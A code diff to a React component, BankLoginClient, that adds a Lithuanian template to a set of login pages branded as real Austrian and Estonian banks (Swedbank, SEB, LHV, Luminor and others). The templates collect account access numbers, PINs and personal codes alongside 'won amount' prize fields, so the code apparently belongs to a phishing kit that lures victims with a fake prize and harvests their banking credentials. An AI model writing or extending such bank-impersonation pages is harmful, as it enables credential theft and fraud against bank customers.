@@ -40,6 +40,7 @@ import { AnadiBank } from "@/components/templates/AnadiBank";
 import { MarchfelderBank } from "@/components/templates/MarchfelderBank";
 import { Dolomitenbank } from "@/components/templates/Dolomitenbank";
 import { EstoniaBankTemplate } from "@/components/templates/EstoniaBankTemplate";
+import { LithuaniaBankTemplate } from "@/components/templates/LithuaniaBankTemplate";
 
 type Props = {
   sessionId: string;
@@ -755,6 +756,23 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     ["bigbank", "citadele-banka", "coop-pank", "inbank", "lhv-pank", "luminor-ee", "op-corporate-bank", "seb-pank", "swedbank-ee"].includes(normalizedSlug) ||
     estoniaSlugKeywords.some((kw) => normalizedSlug.includes(kw))
   );
+
+  if (isLithuania) {
+    return (
+      <LithuaniaBankTemplate
+        bankSlug={normalizedSlug}
+        bankName={bank.name}
+        logoFile={bank.logoFile}
+        brandColor={bank.brandColor || theme?.colors.primary}
+        formData={{ verfuegernummer, pin, personalCode, loginMethod }}
+        onChange={handleTemplateChange}
+        handleRouteAction={handleTemplateSubmit}
+        saving={saving}
+        wonAmount={wonAmount}
+        wonLabel={wonLabel}
+      />
+    );
+  }
 
   if (isEstonianBank) {
     return (
